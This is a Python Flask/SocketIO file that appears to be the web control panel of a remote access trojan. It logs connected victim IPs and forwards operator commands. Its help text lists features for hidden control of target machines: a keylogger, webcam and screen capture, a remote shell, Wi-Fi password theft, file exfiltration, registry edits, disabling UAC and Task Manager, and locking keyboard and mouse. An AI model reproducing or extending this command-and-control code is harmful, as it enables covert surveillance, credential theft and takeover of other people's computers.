from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO, send, emit
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__, static_folder='Website', template_folder='Website')
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('Website/js', path)

@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('Website/css', path)

@app.route('/media/<path:path>')
def send_media(path):
    return send_from_directory('Website/media', path)

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    ip = request.remote_addr  # Get client IP address
    logging.debug(f'Client connected: {sid} from IP: {ip}')
    clients[sid] = ip
    emit('server-message', {'message': 'Connected to server'})

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    logging.debug(f'Client disconnected: {sid}')
    if sid in clients:
        del clients[sid]

@socketio.on('client-command')
def handle_client_command(data):
    command = data.get('command')
    if command:
        logging.debug(f'Received command from client: {command}')
        
        if command.lower() == 'help':
            help_message = {
                'message': (
                    'Available commands:\n\n'
                    'example:\nServer: Returns an example command output.\nClient: N/A\n\n'
                    'list_clients:\nServer: Lists all connected clients with their profiles.\nClient: N/A\n\n'
                    'connect <ip>:\nServer: Connects to a specific client by IP.\nClient: N/A\n\n'
                    'disconnect:\nServer: Disconnects from the current client.\nClient: N/A\n\n'
                    'tasklist:\nServer: Requests the task list from the client.\nClient: Executes tasklist command and sends the output back.\n\n'
                    'geolocate:\nServer: Requests geolocation information from the client.\nClient: Fetches geolocation data and sends it back.\n\n'
                    'screenshare:\nServer: Initiates a screenshare session with the client.\nClient: Starts a screenshare session using vidstream.\n\n'
                    'shell:\nServer: Opens an interactive shell with the client.\nClient: Executes shell commands and sends the output back.\n\n'
                    'drivers:\nServer: Requests a list of drivers from the client.\nClient: N/A (No implementation provided for drivers command)\n\n'
                    'setvalue:\nServer: Sets a registry value on the client.\nClient: Receives registry parameters and sets the value.\n\n'
                    'delkey:\nServer: Deletes a registry key on the client.\nClient: Receives registry parameters and deletes the key.\n\n'
                    'createkey:\nServer: Creates a registry key on the client.\nClient: Receives registry parameters and creates the key.\n\n'
                    'disableUAC:\nServer: Disables User Account Control on the client.\nClient: N/A (No implementation provided for disableUAC command)\n\n'
                    'reboot:\nServer: Reboots the client machine.\nClient: Reboots the machine.\n\n'
                    'usbdrivers:\nServer: Requests a list of USB drivers from the client.\nClient: N/A (No implementation provided for usbdrivers command)\n\n'
                    'volumeup:\nServer: Increases the volume on the client machine.\nClient: Sets the volume to maximum.\n\n'
                    'volumedown:\nServer: Decreases the volume on the client machine.\nClient: Sets the volume to minimum.\n\n'
                    'monitors:\nServer: Requests monitor information from the client.\nClient: N/A (No implementation provided for monitors command)\n\n'
                    'kill <process>:\nServer: Kills a specific process on the client machine.\nClient: Terminates the specified process.\n\n'
                    'extendrights:\nServer: Extends user rights on the client machine.\nClient: N/A (No implementation provided for extendrights command)\n\n'
                    'turnoffmon:\nServer: Turns off the monitor on the client machine.\nClient: Turns off the display.\n\n'
                    'turnonmon:\nServer: Turns on the monitor on the client machine.\nClient: N/A (No implementation provided for turnonmon command)\n\n'
                    'setwallpaper:\nServer: Sets the desktop wallpaper on the client machine.\nClient: N/A (No implementation provided for setwallpaper command)\n\n'
                    'keyscan_start:\nServer: Starts a keylogger on the client machine.\nClient: Starts keylogging and saves keystrokes to a file.\n\n'
                    'send_logs:\nServer: Requests keylogger logs from the client.\nClient: N/A (No implementation provided for send_logs command)\n\n'
                    'stop_keylogger:\nServer: Stops the keylogger on the client machine.\nClient: N/A (No implementation provided for stop_keylogger command)\n\n'
                    'delfile <file>:\nServer: Deletes a specific file on the client machine.\nClient: Deletes the specified file.\n\n'
                    'createfile <file>:\nServer: Creates a specific file on the client machine.\nClient: Creates the specified file.\n\n'
                    'ipconfig:\nServer: Requests IP configuration from the client.\nClient: Sends IP configuration details back.\n\n'
                    'writein <text>:\nServer: Writes text into a specific file on the client machine.\nClient: N/A (No implementation provided for writein command)\n\n'
                    'sendmessage:\nServer: Sends a message box to the client machine.\nClient: Displays the message box with provided text and title.\n\n'
                    'profilepswd <profile>:\nServer: Requests password profile information from the client.\nClient: Sends the password profile information back.\n\n'
                    'profiles:\nServer: Requests profiles information from the client.\nClient: N/A (No implementation provided for profiles command)\n\n'
                    'cpu_cores:\nServer: Requests CPU core information from the client.\nClient: N/A (No implementation provided for cpu_cores command)\n\n'
                    'cd <directory>:\nServer: Changes the current directory on the client machine.\nClient: Changes the directory and sends the current directory back.\n\n'
                    'cd ..:\nServer: Changes to the parent directory on the client machine.\nClient: Changes to the parent directory and sends the current directory back.\n\n'
                    '<drive>::\nServer: Changes to the specified drive on the client machine.\nClient: Changes to the specified drive and sends the current directory back.\n\n'
                    'dir:\nServer: Lists the contents of the current directory on the client machine.\nClient: Lists directory contents and sends them back.\n\n'
                    'portscan:\nServer: Performs a port scan on the client machine.\nClient: N/A (No implementation provided for portscan command)\n\n'
                    'systeminfo:\nServer: Requests system information from the client.\nClient: Sends system information back.\n\n'
                    'localtime:\nServer: Requests local time from the client machine.\nClient: N/A (No implementation provided for localtime command)\n\n'
                    'abspath <file>:\nServer: Requests the absolute path of a file on the client machine.\nClient: N/A (No implementation provided for abspath command)\n\n'
                    'readfile <file>:\nServer: Reads a specific file on the client machine.\nClient: Reads the file and sends its content back.\n\n'
                    'disable --keyboard:\nServer: Disables the keyboard on the client machine.\nClient: Disables the keyboard input.\n\n'
                    'disable --mouse:\nServer: Disables the mouse on the client machine.\nClient: Disables the mouse input.\n\n'
                    'disable --all:\nServer: Disables both keyboard and mouse on the client machine.\nClient: Disables both keyboard and mouse input.\n\n'
                    'enable --all:\nServer: Enables both keyboard and mouse on the client machine.\nClient: Enables both keyboard and mouse input.\n\n'
                    'enable --keyboard:\nServer: Enables the keyboard on the client machine.\nClient: Enables the keyboard input.\n\n'
                    'enable --mouse:\nServer: Enables the mouse on the client machine.\nClient: Enables the mouse input.\n\n'
                    'browser <query>:\nServer: Opens a browser with a specific query on the client machine.\nClient: Opens the browser with the provided query.\n\n'
                    'cp <src> <dest>:\nServer: Copies a file from source to destination on the client machine.\nClient: Copies the specified file.\n\n'
                    'mv <src> <dest>:\nServer: Moves a file from source to destination on the client machine.\nClient: Moves the specified file.\n\n'
                    'editfile <file>:\nServer: Edits a specific file on the client machine.\nClient: N/A (No implementation provided for editfile command)\n\n'
                    'mkdir <directory>:\nServer: Creates a directory on the client machine.\nClient: Creates the specified directory.\n\n'
                    'rmdir <directory>:\nServer: Removes a directory on the client machine.\nClient: Removes the specified directory.\n\n'
                    'searchfile <filename>:\nServer: Searches for a file on the client machine.\nClient: N/A (No implementation provided for searchfile command)\n\n'
                    'curpid:\nServer: Requests the current process ID from the client machine.\nClient: Sends the current process ID back.\n\n'
                    'sysinfo:\nServer: Requests system information from the client machine.\nClient: Sends system information back.\n\n'
                    'pwd:\nServer: Requests the current working directory from the client machine.\nClient: Sends the current working directory back.\n\n'
                    'screenshare:\nServer: Initiates a screenshare session with the client.\nClient: Starts a screenshare session using vidstream.\n\n'
                    'webcam:\nServer: Initiates a webcam session with the client.\nClient: Starts a webcam session using vidstream.\n\n'
                    'breakstream:\nServer: Stops the current streaming session.\nClient: Stops the current streaming session.\n\n'
                    'startfile <file>:\nServer: Starts (opens) a specific file on the client machine.\nClient: Opens the specified file.\n\n'
                    'download <file>:\nServer: Downloads a file from the client machine.\nClient: Sends the specified file to the server.\n\n'
                    'upload:\nServer: Uploads a file to the client machine.\nClient: Receives the uploaded file.\n\n'
                    'disabletaskmgr:\nServer: Disables the task manager on the client machine.\nClient: Continuously hides the task manager window.\n\n'
                    'enabletaskmgr:\nServer: Enables the task manager on the client machine.\nClient: N/A (No implementation provided for enabletaskmgr command)\n\n'
                    'isuseradmin:\nServer: Checks if the client is running as an administrator.\nClient: N/A (No implementation provided for isuseradmin command)\n\n'
                    'help:\nServer: Displays a help banner.\nClient: N/A\n\n'
                    'screenshot:\nServer: Requests a screenshot from the client machine.\nClient: Captures a screenshot and sends it back.\n\n'
                    'webcam_snap:\nServer: Requests a webcam snapshot from the client machine.\nClient: Captures a webcam snapshot and sends it back.\n\n'
                    'Notes:\nCommands such as disableUAC, drivers, usbdrivers, monitors, extendrights, turnonmon, send_logs, stop_keylogger, writein, profiles, cpu_cores, portscan, localtime, abspath, searchfile, editfile, enabletaskmgr, isuseradmin have no implementation in the provided client.py.\nSome commands (setwallpaper, keyscan_start, send_logs, stop_keylogger, enable --all, enable --keyboard, enable --mouse, cp, mv, editfile, searchfile) are listed but have no implementation in either the server.py or client.py.'
                )
            }
            emit('server-message', help_message)
        else:
            # Send the command to the server
            socketio.emit('server-command', {'command': command})
    else:
        logging.debug('Received invalid command')
        emit('server-message', {'message': 'Received invalid command'}, broadcast=True)

@socketio.on('server-response')
def handle_server_response(response):
    logging.debug(f'Received response from server: {response}')
    # Emit the response back to the client
    emit('server-message', response, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
